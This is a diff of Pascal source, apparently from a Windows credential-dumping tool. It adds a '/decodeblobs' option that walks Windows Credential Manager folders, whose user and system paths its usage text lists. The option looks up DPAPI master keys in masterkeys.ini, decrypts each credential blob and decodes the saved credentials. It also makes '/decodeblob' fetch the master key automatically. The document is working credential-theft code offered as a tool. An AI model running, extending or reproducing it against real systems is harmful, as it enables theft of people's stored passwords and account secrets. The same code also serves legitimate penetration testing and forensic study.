@@ -262,7 +262,7 @@ var
   p,ret,dw,dw1,dw2:dword;
   n:nativeint;
   consolecp:uint;
-  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key,luid:string;
+  rid,folder,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key,luid:string;
   inputw:widestring;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
@@ -279,6 +279,7 @@ var
   inhandle,hmod,ProcessHandle:thandle;
   MemoryRegions:TMemoryRegions;
   list:TStringList;
+  SR      :TSearchRec ;
 
 
 
@@ -2380,19 +2381,70 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
          then log('CryptUnProtectData_ NOT OK',1)
          else log('CryptUnProtectData_ OK - written : data.blob',1);
      end;
+  p:=pos('/decodeblobs',cmdline);
+    if p>0 then
+       begin
+       if input='' then
+          begin
+          log('provide a path where credentials are stored like:',1);
+          log('C:\Users\%username%\AppData\Roaming\Microsoft\Credentials',1);
+          log('C:\Users\%username%\AppData\local\Microsoft\Credentials',1);
+          log('C:\windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials',1);
+          goto fin;
+          end;
+       folder:=input;
+       log('folder:'+folder);
+       if sysutils.findFirst(folder+'\*.*', $0000003f, SR) = 0 then
+          begin
+            repeat
+                if (SR.Name <> '.') and (SR.Name <> '..') then
+                  begin
+                  log('filename:'+SR.Name);
+                  fillchar(myblob,sizeof(myblob),0);
+                  if decodeblob (folder+'\'+ sr.name,@myblob,0)=true then
+                     begin
+                     input:=readini(GUIDToString(myblob.guidMasterKey),'MasterKey','','masterkeys.ini');
+                     if input<>'' then
+                        begin
+                        input_:=HexaStringToByte2(input);
+                        dw:=0;
+                        if dpapi_unprotect_blob(@myblob,@input_[0] ,length(input_),nil,0,nil,ptr_,dw) then
+                           begin
+                           if dw>=64 then
+                              begin
+                              log('******** Decoding Cred Blob ********',1);
+                              log('filename:'+SR.Name,1);
+                              //decodecredblob(@output_[0]);
+                              decodecredblob(ptr_);
+                              end; //if dw>=64 then
+                           end; //if dpapi_unprotect_blob ...
+                        end; //if input<>'' ...
+                     end; //if decodeblob ...
+                  end; //if (SR.Name <> '.') ...
+            until sysutils.FindNext(SR) <> 0;
+            sysutils.FindClose(SR);
+          end;
+       goto fin;
+       end;
   p:=pos('/decodeblob',cmdline);
     if p>0 then
        begin
+       fillchar(myblob,sizeof(myblob),0);
        if (binary='') and FileExists ('data.blob') then binary:='data.blob';
        if binary='' then exit;
        if not FileExists (binary) then begin writeln('file does not exist');exit;end;
        log('filename:'+extractfilename(binary),1);
        if input='' then
-          if decodeblob (binary,nil)=false then log('not ok',1);
-        if input<>'' then
+          begin
+          if decodeblob (binary,@myblob,1)=false then log('not ok',1);
+          //goto fin;
+          input:=readini(GUIDToString(myblob.guidMasterKey),'MasterKey','','masterkeys.ini');
+          end;
+       if input<>'' then
            begin
+           fillchar(myblob,sizeof(myblob),0);
            //pblob:=getmem(sizeof(tdpapi_blob));
-           if decodeblob (binary,@myblob)=false then begin log('not ok',1);exit;end;
+           if decodeblob (binary,@myblob,0)=false then begin log('not ok',1);exit;end;
            input_:=HexaStringToByte2(input);
            log('length(input_):'+inttostr(length(input_)));
            log('**** Unprotecting Blob ****',1);
@@ -2406,7 +2458,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
              if dw<64 then log('Blob:'+BytetoAnsiString (ptr_,dw),1);
              if dw>=64 then
                begin
-               log('**** Decoding Cred Blob ****',1);
+               log('******** Decoding Cred Blob ********',1);
                //decodecredblob(@output_[0]);
                decodecredblob(ptr_);
                end;
